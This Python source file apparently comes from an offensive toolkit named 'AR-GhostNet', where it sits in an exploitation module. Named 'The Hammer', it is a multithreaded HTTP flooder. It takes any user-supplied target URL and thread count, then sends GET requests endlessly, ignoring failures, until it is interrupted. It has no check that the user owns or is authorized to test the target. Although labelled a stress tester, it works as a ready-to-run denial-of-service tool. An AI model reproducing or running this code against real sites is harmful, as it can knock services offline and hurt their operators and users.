# AR-GhostNet | Stress Testing Engine (The Hammer)
# Location: modules/exploitation/stresser.py

import requests
import threading
from utils.colors import Colors
from config.settings import Settings

class Stresser:
    def __init__(self):
        self.timeout = Settings.DEFAULT_TIMEOUT
        self.active = False
        self.request_count = 0

    def attack(self, url):
        while self.active:
            try:
                # Sending a simple GET request to stress the server
                requests.get(url, timeout=self.timeout)
                self.request_count += 1
                if self.request_count % 100 == 0:
                    print(f"{Colors.YELLOW}[*] Requests sent: {self.request_count}...{Colors.RESET}")
            except requests.exceptions.RequestException:
                # We ignore connection errors because the server might be slowing down
                pass

    def start(self):
        print(f"{Colors.CYAN}--- THE HAMMER: Stress Testing Engine ---{Colors.RESET}")
        target_url = input(f"{Colors.GREEN}Enter Target URL (e.g. http://example.com): {Colors.RESET}")
        
        if not target_url.startswith("http"):
            print(f"{Colors.RED}[!] Error: URL must start with http:// or https://{Colors.RESET}")
            return

        thread_count = input(f"{Colors.GREEN}Enter Number of Threads (e.g. 100): {Colors.RESET}")
        
        try:
            threads_num = int(thread_count)
        except ValueError:
            print(f"{Colors.RED}[!] Invalid number. Using default 50.{Colors.RESET}")
            threads_num = 50

        print(f"{Colors.RED}[!] Starting the Hammer... Target: {target_url}{Colors.RESET}")
        self.active = True
        
        threads_list = []
        for i in range(threads_num):
            t = threading.Thread(target=self.attack, args=(target_url,))
            t.start()
            threads_list.append(t)

        print(f"{Colors.GREEN}[+] Attack launched with {threads_num} threads. Press Ctrl+C to stop.{Colors.RESET}")
        
        try:
            # Keep the main thread alive while others are attacking
            while True:
                pass
        except KeyboardInterrupt:
            self.active = False
            print(f"\n{Colors.YELLOW}[*] Stopping The Hammer... Total requests sent: {self.request_count}{Colors.RESET}")

# For standalone testing
if __name__ == "__main__":
    hammer = Stresser()
    hammer.start()